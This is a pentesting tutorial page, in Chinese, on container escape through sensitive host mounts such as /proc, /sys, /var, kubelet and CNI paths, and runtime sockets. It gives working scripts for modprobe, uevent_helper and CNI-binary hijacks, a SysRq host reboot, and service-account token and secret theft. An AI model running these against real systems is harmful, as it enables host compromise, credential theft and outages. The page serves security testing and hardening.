# 敏感 Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Host mounts 是最重要的实际 container-escape 攻击面之一，因为它们经常会将经过精心隔离的进程视图重新折叠为对 Host 资源的直接可见性。危险情况并不局限于 `/`。对 `/proc`、`/sys`、`/var`、runtime sockets、kubelet 管理的状态目录或与设备相关路径执行 bind mounts，可能暴露 kernel 控制接口、凭据、相邻 container 的文件系统以及 runtime 管理接口。

本页面与各个独立的防护页面分开存在，因为其滥用模型涉及多个方面。可写的 Host mount 之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux 的覆盖范围，还有部分原因在于具体暴露了哪个 Host 路径。将其作为独立主题处理，可以更容易地分析攻击面。

## `/proc` 暴露

procfs 同时包含普通的进程信息和高影响力的 kernel 控制接口。因此，类似 `-v /proc:/host/proc` 的 bind mount，或暴露了意外可写 proc 条目的 container 视图，可能导致信息泄露、拒绝服务或直接在 Host 上执行代码。

高价值的 procfs 路径包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 滥用

首先检查哪些高价值 procfs 条目可见或可写：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径因不同原因而值得关注。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为 host code-execution 路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时强大的侦察信息源。`sched_debug` 和 `mountinfo` 会暴露进程、cgroup 以及文件系统上下文，有助于从 container 内部重建 host 布局。

每个路径的实际价值各不相同；如果把它们视为具有相同影响，会增加 triage 的难度：

- `/proc/sys/kernel/core_pattern`
如果可写，这是影响最大的 procfs 路径之一，因为 kernel 会在发生崩溃后执行管道处理程序。能够将 `core_pattern` 指向存储在其 overlay 或已挂载 host 路径中的 payload 的 container，通常可以获得 host code execution。另请参阅 [read-only-paths.md](protections/read-only-paths.md) 中的专门示例。
- `/proc/sys/kernel/modprobe`
此路径控制 kernel 在需要调用 module-loading 逻辑时使用的 userspace helper。如果 container 可以写入该路径，并且其内容在 host 上下文中被解释，它可能成为另一种 host code-execution primitive。当存在触发该 helper 路径的方法时，此路径尤其值得关注。
- `/proc/sys/vm/panic_on_oom`
这通常不是一种干净的 escape primitive，但它可以将内存压力转化为影响整个 host 的 denial of service：把 OOM 条件转变为 kernel panic 行为。
- `/proc/sys/fs/binfmt_misc`
如果注册接口可写，attacker 可能会为指定的 magic value 注册 handler，并在执行匹配文件时获得 host-context execution。
- `/proc/config.gz`
对 kernel exploit triage 很有用。无需 host package metadata，它即可帮助确定哪些 subsystem、mitigation 以及可选 kernel feature 已启用。
- `/proc/sysrq-trigger`
主要是 denial-of-service 路径，但危害非常严重。它可以立即 reboot、触发 panic 或以其他方式干扰 host。
- `/proc/kmsg`
会暴露 kernel ring buffer 消息。它可用于 host fingerprinting、crash analysis，并且在某些环境中可能 leak 对 kernel exploitation 有帮助的信息。
- `/proc/kallsyms`
在可读时很有价值，因为它会暴露 exported kernel symbol 信息，并可能帮助在 kernel exploit 开发期间规避对 address randomization 的假设。
- `/proc/[pid]/mem`
这是一个直接的进程内存接口。如果能够满足必要的 ptrace-style 条件并访问目标进程，它可能允许读取或修改其他进程的内存。实际影响高度取决于 credentials、`hidepid`、Yama 以及 ptrace 限制，因此这是一个强大但有条件的路径。
- `/proc/kcore`
会暴露类似 core image 的系统内存视图。该文件非常庞大且难以使用，但如果它确实可读，则说明 host memory surface 暴露严重。
- `/proc/kmem` 和 `/proc/mem`
历史上影响很大的 raw memory 接口。在许多现代系统中，它们已被禁用或受到严格限制；但如果存在且可用，应将其视为 critical findings。
- `/proc/sched_debug`
会 leak 调度和任务信息，即使其他进程视图看起来比预期更干净，也可能暴露 host process identities。
- `/proc/[pid]/mountinfo`
对于重建 container 在 host 上的真实位置、确定哪些路径由 overlay 支持，以及判断某个可写 mount 对应的是 host content 还是仅 container layer，都极其有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 详细信息可读，请使用它们恢复 container filesystem 在 host 上的路径：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧都需要将容器内的路径转换为从主机视角对应的路径。

### 完整示例：`modprobe` Helper Path Abuse

如果可以从容器内写入 `/proc/sys/kernel/modprobe`，且 helper path 在主机上下文中进行解析，则可以将其重定向到攻击者控制的 payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
具体触发方式取决于目标和 kernel 行为，但关键点在于：可写的 helper 路径可以将未来的 kernel helper 调用重定向到由攻击者控制的 host-path 内容。

### Full Example: 使用 `kallsyms`、`kmsg` 和 `config.gz` 进行 Kernel Recon

如果目标是评估 exploitability，而不是立即 escape：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于判断是否可以获取有用的符号信息、近期的 kernel 消息是否泄露了有趣的状态，以及编译时是否启用了哪些 kernel 功能或缓解措施。其影响通常不是直接 escape，但可以显著缩短 kernel vulnerability triage 的时间。

### 完整示例：SysRq 主机重启

如果 `/proc/sysrq-trigger` 可写，并且能够访问主机视图：
```bash
echo b > /proc/sysrq-trigger
```
效果是立即重启主机。这不是一个隐蔽的示例，但它清楚地表明，暴露 procfs 可能比信息泄露严重得多。

## `/sys` 暴露

sysfs 暴露大量内核和设备状态。某些 sysfs 路径主要用于指纹识别，而其他路径则可能影响 helper 执行、设备行为、安全模块配置或固件状态。

高价值 sysfs 路径包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径的重要性各不相同。`/sys/class/thermal` 可能影响 thermal-management 行为，因此在暴露不当的环境中影响主机稳定性。`/sys/kernel/vmcoreinfo` 可能泄露 crash-dump 和内核布局信息，从而帮助进行低级别的主机指纹识别。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此对其进行非预期访问可能暴露或修改与 MAC 相关的状态。EFI 变量路径可能影响由固件支持的启动设置，因此其严重性远高于普通配置文件。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本身就是面向开发者的接口，相比面向生产环境且经过加固的内核 API，其安全保障要少得多。

用于审查这些路径的实用命令如下：
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
这些命令为何值得关注：

- `/sys/kernel/security` 可能暴露 AppArmor、SELinux 或其他 LSM 表面，表明本应仅对 host 可见的内容被暴露出来。
- `/sys/kernel/debug` 通常是这一组中最令人担忧的发现。如果已挂载 `debugfs` 且可读或可写，那么应预期存在一个广泛的、面向 kernel 的攻击面，其确切风险取决于已启用的 debug 节点。
- EFI 变量暴露并不常见，但影响很大，因为它涉及由 firmware 支持的设置，而不是普通的运行时文件。
- `/sys/class/thermal` 主要与 host 稳定性和硬件交互有关，而不是用于实现简洁的 shell-style escape。
- `/sys/kernel/vmcoreinfo` 主要是 host 指纹识别和崩溃分析来源，有助于了解低级别的 kernel 状态。

### 完整示例：`uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，当触发 `uevent` 时，kernel 可能会执行由攻击者控制的 helper：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
之所以能够奏效，是因为 helper path 是从 host 的视角进行解析的。触发后，helper 会在 host context 中运行，而不是在当前 container 内部运行。

## `/var` 暴露

将 host 的 `/var` 挂载到 container 中通常容易被低估，因为它看起来不像挂载 `/` 那么严重。实际上，这足以访问 runtime sockets、container snapshot directories、kubelet 管理的 pod volumes、projected service-account tokens，以及相邻应用的 filesystems。在现代节点上，`/var` 通常是最有操作价值的 container 状态实际所在位置。

### Kubernetes Example

带有 `hostPath: /var` 的 pod 通常可以读取其他 pod 的 projected tokens 和 overlay snapshot content：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们可以回答该挂载是否仅暴露普通应用数据，还是暴露了高影响的 cluster credentials。可读取的 service-account token 可能会立即将本地 code execution 转化为 Kubernetes API access。

如果存在该 token，请验证它能够访问的资源，而不要止步于 token discovery：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远不止本地节点访问。一个具有广泛 RBAC 权限的 token 可以将已挂载的 `/var` 转化为整个集群的失陷。

### Docker 和 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`；而在由 containerd 支持的 Kubernetes 节点上，相关数据可能位于 `/var/lib/containerd` 或特定于 snapshotter 的路径下：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个 workload 的可写 snapshot 内容，攻击者可能无需接触当前 container 配置，即可修改应用文件、植入 Web 内容或更改启动脚本。

找到可写的 snapshot 内容后，具体的滥用思路包括：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些命令很有用，因为它们展示了已挂载 `/var` 的三大主要影响类别：应用篡改、secret 恢复，以及向相邻 workload 进行 lateral movement。

## Kubelet State、Plugins 和 CNI Paths

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 通常会通过 privileged DaemonSets、CNI agents、CSI node plugins、GPU operators 和 storage helpers 暴露出来。这些挂载很容易被忽略为“节点管线”，但它们直接位于新 pod 的执行路径中，并且通常包含 kubelet credentials、projected secrets、registration sockets 以及可执行的主机侧 plugin binaries。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用的审查命令如下：
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
为什么这些路径很重要：

- `/var/lib/kubelet/pki` 可能暴露 kubelet client certificates 以及其他节点本地凭据；根据集群设计，这些凭据有时可以被复用于 API server 或面向 kubelet 的 TLS endpoints。
- `/var/lib/kubelet/pods` 通常包含投射的 service-account tokens，以及同一节点上相邻 pods 的挂载 Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance surface，但非常有用：它会披露当前哪些 pods 和 containers 正在使用 GPUs、hugepages、SR-IOV devices 以及其他稀缺的节点本地资源。
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 会披露已安装的 CSI、DRA 和 device plugins，以及 kubelet 预期与之通信的 sockets。如果这些目录是可写的，而不仅仅是可读的，那么该 finding 就会严重得多。
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接位于 pod-network setup path 上。对这些路径的可写访问通常是一种延迟触发的 host-execution primitive，而不只是配置暴露。

### 完整示例：可写的 `/opt/cni/bin`

如果 host CNI binary directory 以 read-write 方式挂载，替换其中的 plugin 可能就足以在 kubelet 下次于该节点创建 pod sandbox 时获得 host execution：
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
这不像挂载 `docker.sock` 那样直接，但在受 compromise 的 Kubernetes infrastructure pod 中通常更符合实际。关键在于，修改后的 binary 随后会由 host network setup flow 执行，而不是由当前 container 执行。


## 运行时套接字

敏感的 host mounts 通常包含 runtime sockets，而不是完整目录。这些内容非常重要，值得在此明确重复：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
有关挂载这些 socket 后的完整 exploitation 流程，请参阅 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)。

作为一种快速的初步交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中一种方式成功，从“mounted socket”到“start a more privileged sibling container”的路径通常比任何 kernel breakout 路径都要短得多。

## Writable Host Path Task Hijack

可写的 host mount 不需要暴露 `/` 才会带来危险。如果挂载路径包含脚本、配置文件、hooks、plugins，或包含稍后由 host-side scheduled task 或 service 使用的文件，那么 container 可能能够修改 host 执行的内容。

通用审查流程：
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
如果主机进程会使用可写文件，请在测试时让 payload 保持简单且可观测：
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
有趣的部分在于信任边界：写入操作发生在容器内部，但执行操作随后发生在 host service 上下文中。这会将范围狭窄的 hostPath 或 bind mount 转变为一种延迟的 host-code-execution 原语。

## 与 Mount 相关的 CVE

Host mounts 也会与 runtime 漏洞产生交集。近期重要的示例包括：

- `runc` 中的 `CVE-2024-21626`：泄露的目录文件描述符可能将工作目录置于 host 文件系统上。
- BuildKit 中的 `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653`：恶意 Dockerfiles、frontends 以及 `RUN --mount` 流程可能在构建期间重新引入 host 文件访问、删除或提升的权限。
- Buildah 和 Podman build 流程中的 `CVE-2024-1753`：构造的 bind mounts 可能以读写方式暴露 `/`。
- `containerd` 2.1.0 中的 `CVE-2025-47290`：image unpack 期间的 TOCTOU 可能使特制 image 在 pull 期间修改 host 文件系统。

这些 CVE 在此处很重要，因为它们表明，mount 处理不仅与 operator 配置有关。runtime 本身也可能引入由 mount 驱动的 escape 条件。

## 检查

使用以下命令快速定位价值最高的 mount 暴露：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里有哪些值得关注的内容：

- Host root、`/proc`、`/sys`、`/var` 和 runtime sockets 都是高优先级发现项。
- 可写的 proc/sys 条目通常意味着该挂载暴露的是主机全局内核控制项，而不是安全的容器视图。
- 挂载的 `/var` 路径需要进行凭据和相邻工作负载审查，而不只是文件系统审查。
- Kubelet 状态目录以及 CNI/plugin 路径应与 runtime sockets 享有同等优先级，因为它们通常直接位于节点的 pod 创建和凭据分发路径上。

## 参考资料

- [Kubelet 使用的本地文件和路径](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
